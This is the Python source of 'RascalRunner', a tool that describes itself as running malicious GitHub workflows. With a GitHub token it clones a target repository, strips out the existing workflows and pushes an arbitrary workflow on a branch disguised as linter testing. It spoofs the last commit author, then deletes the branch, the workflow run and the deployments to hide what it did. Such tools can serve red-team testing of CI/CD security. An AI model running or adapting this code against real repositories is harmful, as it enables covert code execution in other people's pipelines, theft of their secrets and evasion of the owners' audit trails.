from github import Github, Auth
from git import Repo, Actor
import tempfile
import requests
import logging
import zipfile
import random
import string
import shutil
import yaml
import time
import sys
import re
import os
import io

logging.basicConfig(
    format="%(asctime)s %(message)s",
    stream=sys.stdout, 
    level=logging.INFO
)

ascii_banner = """
 ██▀███   ▄▄▄        ██████  ▄████▄   ▄▄▄       ██▓        ██▀███   █    ██  ███▄    █  ███▄    █ ▓█████  ██▀███  
▓██ ▒ ██▒▒████▄    ▒██    ▒ ▒██▀ ▀█  ▒████▄    ▓██▒       ▓██ ▒ ██▒ ██  ▓██▒ ██ ▀█   █  ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒
▓██ ░▄█ ▒▒██  ▀█▄  ░ ▓██▄   ▒▓█    ▄ ▒██  ▀█▄  ▒██░       ▓██ ░▄█ ▒▓██  ▒██░▓██  ▀█ ██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒
▒██▀▀█▄  ░██▄▄▄▄██   ▒   ██▒▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒██░       ▒██▀▀█▄  ▓▓█  ░██░▓██▒  ▐▌██▒▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  
░██▓ ▒██▒ ▓█   ▓██▒▒██████▒▒▒ ▓███▀ ░ ▓█   ▓██▒░██████▒   ░██▓ ▒██▒▒▒█████▓ ▒██░   ▓██░▒██░   ▓██░░▒████▒░██▓ ▒██▒
░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░▓  ░   ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒ ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
  ░▒ ░ ▒░  ▒   ▒▒ ░░ ░▒  ░ ░  ░  ▒     ▒   ▒▒ ░░ ░ ▒  ░     ░▒ ░ ▒░░░▒░ ░ ░ ░ ░░   ░ ▒░░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░
  ░░   ░   ░   ▒   ░  ░  ░  ░          ░   ▒     ░ ░        ░░   ░  ░░░ ░ ░    ░   ░ ░    ░   ░ ░    ░     ░░   ░ 
   ░           ░  ░      ░  ░ ░            ░  ░    ░  ░      ░        ░              ░          ░    ░  ░   ░     
                            ░                                                                                     
"""

class RascalRunner:

    def __init__(self, target, workflow, token):
        self._target = target
        self._workflow = workflow
        self._token = token
        self._branch_name = f"lint-testing-{''.join(random.choice(string.ascii_letters) for i in range(5))}"

    @property
    def target(self):
        return self._target
    
    @target.setter
    def target(self, target):
        if "/" not in target:
            raise Exception("Target repository doesn't contain a Github account. Please provide in the account/repo format.")
        self._target = target
    
    @property
    def workflow(self):
        return self._workflow
    
    @workflow.setter
    def workflow(self, workflow):
        try:
            with open(workflow, "r") as fh:
                try:
                    config = yaml.safe_load(fh)
                    self._workflow = workflow
                except Exception as e:
                    raise Exception(f"Workflow file doesn't contain valid YAML: {e}")
        except Exception as e:
            raise Exception(f"Couldn't open workflow file: {e}")
        
    @property
    def token(self):
        return self._token
    
    @token.setter
    def token(self, token):
        pattern = r"^ghp_[a-zA-Z0-9]{36}$"
        if not re.match(pattern, token):
            raise Exception("Token provided doesn't seem to be valid. It should match {pattern}.")
        self._token = token


    def _github_api_call(self, method, url, payload=False):
        # sometimes have to call the api directly because pygithub doesn't support an action
        headers = {
            "Authorization": f"Bearer {self._token}",
            "Accept": "application/vnd.github+json"
        }

        args = {
            "method": method,
            "url": url,
            "headers": headers,
        }

        if payload:
            args["data"] = payload

        return requests.request(**args)


    def _login(self):
        try:
            auth = Auth.Token(self._token)
            gh = Github(auth=auth)
        except Exception as e:
            raise Exception(f"Couldn't authenticate to Github using the token provided: {e}")

        # https://github.com/PyGithub/PyGithub/issues/1943
        gh.get_rate_limit()

        oauth_scopes = gh.oauth_scopes
        if "repo" not in oauth_scopes:
            raise Exception(f"Repo access isn't allowed with the provided token. RascalRunner won't work with this token.")
        elif "workflow" not in oauth_scopes:
            raise Exception(f"Workflow access isn't allowed with the provided token. RascalRunner won't be able to pull logs or clean up the workflow run.")
        
        logging.info("Login to Github successful")
        logging.debug(f"Auth token has scopes: {oauth_scopes}")

        self._token_scope = oauth_scopes
        self._github = gh


    def _clone_repository(self):
        self._tmp_dir = tempfile.TemporaryDirectory()
        logging.debug(f"Created tmp directory {self._tmp_dir.name}")
        repo_url = f"https://{self._token}@github.com/{self._target}.git"
        try:
            self._repo = Repo.clone_from(repo_url, self._tmp_dir.name)
            logging.debug(f"Cloned {repo_url} to {self._tmp_dir.name}")
        except Exception as e:
            raise Exception(f"Failed to clone repository: {e}")


    def _push_workflow(self):
        branch = self._repo.create_head(self._branch_name).checkout()
        self._branch = branch

        shutil.rmtree(f"{self._tmp_dir.name}/.github/workflows/")
        self._repo.index.remove([f"{self._tmp_dir.name}/.github/workflows/"], working_tree=True, r=True)
        os.mkdir(f"{self._tmp_dir.name}/.github/workflows/")
        logging.debug(f"Removed any previously committed workflow files from .github/workflows")
        os.makedirs(f"{self._tmp_dir.name}/.github/workflows/", exist_ok=True)

        workflow_basename = os.path.basename(self._workflow)
        shutil.copy2(self._workflow, f"{self._tmp_dir.name}/.github/workflows/{workflow_basename}")

        last_author_name = self._repo.head.commit.author.conf_name
        last_author_email = self._repo.head.commit.author.conf_email
        actor = Actor(last_author_name, last_author_email)

        self._repo.git.add(f".github/workflows/{workflow_basename}")
        self._repo.index.commit("testing out new linter workflow", author=actor, committer=actor)

        remote = self._repo.remote("origin")
        remote.push(refspec=f"{self._branch_name}:{self._branch_name}", set_upstream=True)

        logging.info(f"Pushed new branch to remote with provided workflow")


    def _delete_deployments(self):
        gh_repo = self._github.get_repo(self._target)
        deployments = gh_repo.get_deployments(ref=self._branch_name)
        logging.info(f"Found {deployments.totalCount} deployments associated with the workflow")
        for deployment in deployments:
            deployment.create_status(state="inactive")
            logging.info(f"Marked deployment with id={deployment.id} as inactive")
            resp = self._github_api_call("DELETE", deployment.url)
            if resp.status_code != 204:
                logging.info(f"Could not delete deployment with id={deployment.id} - please clean up manually")
            else:
                logging.info(f"Cleaned up deployment with id={deployment.id}")


    def _remove_remote_branch(self):
        remote = self._repo.remote("origin")
        remote.push(refspec=(f":refs/heads/{self._branch_name}"))
        logging.info(f"Removed remote branch")


    def _download_run_logs(self, run_logs_url):
        resp = self._github_api_call("GET", run_logs_url)
        zip_buf = io.BytesIO(resp.content)

        with zipfile.ZipFile(zip_buf, "r") as zip_ref:
            # extract the 0_<job_name>.txt file from the downloaded zip - throw out the rest
            pattern = re.compile(r"0_.*\.txt$")
            matches = [name for name in zip_ref.namelist() if pattern.match(name)]
            if matches:
                zipped_name = matches[0]
                output_bytes = zip_ref.read(zipped_name)

                repo_name = self._github.get_repo(self._target).name
                workflow_filename = os.path.basename(self._workflow).split(".")[0]
                with open(f"{repo_name}-{workflow_filename}-{int(time.time())}.txt", "wb") as output_file:
                    output_file.write(output_bytes)
                    logging.info(f"Wrote workflow output to {workflow_filename}")


    def _wait_for_workflow(self):
        gh_repo = self._github.get_repo(self._target) # different from self._repo, bound to github api
        while True:
            # once we find a single workflow run, we know the code correctly kicked off a run and remove the branch remotely
            logging.debug(f"Waiting for workflow job to get kicked off")
            time.sleep(3)
            run = next(iter(gh_repo.get_workflow_runs(branch=self._branch_name)), None)
            if run:
                self._remove_remote_branch()
                logging.info(f"Found a running job, waiting for it to exit")
                while True:
                    time.sleep(3)
                    run = next(iter(gh_repo.get_workflow_runs(branch=self._branch_name)), None)
                    if run.status == "completed":
                        logging.info(f"Job completed")
                        self._download_run_logs(run.logs_url)
                        run.delete()
                        logging.info(f"Removed workflow from the github UI")
                        return


    def _cleanup(self):
        self._tmp_dir.cleanup()


    def run(self):
        self._login()
        self._clone_repository()
        self._push_workflow()
        self._wait_for_workflow()
        self._delete_deployments()
        self._cleanup()
        return


def main():
    import argparse 

    parser = argparse.ArgumentParser(description="Run malicious github workflows")
    parser.add_argument("-v", "--verbose", help="Tell me what that little rascal is doing.", action="store_true")
    parser.add_argument("-a", "--auth", help="Github authentication token. Used to clone the repository and remove the workflow run.", required=True)
    parser.add_argument("-r", "--repo", help="The repository to clone and insert the workflow into (ie, nopcorn/rascalrunner).", required=True)
    parser.add_argument("-w", "--workflow-file", help="Workflow file to commit and run.", required=True)
    args = vars(parser.parse_args())

    print(ascii_banner)

    if args["verbose"]:
        logging.getLogger().setLevel(logging.DEBUG)

    rascal = RascalRunner(args["repo"], args["workflow_file"], args["auth"])
    rascal.run()

if __name__ == "__main__":
    main()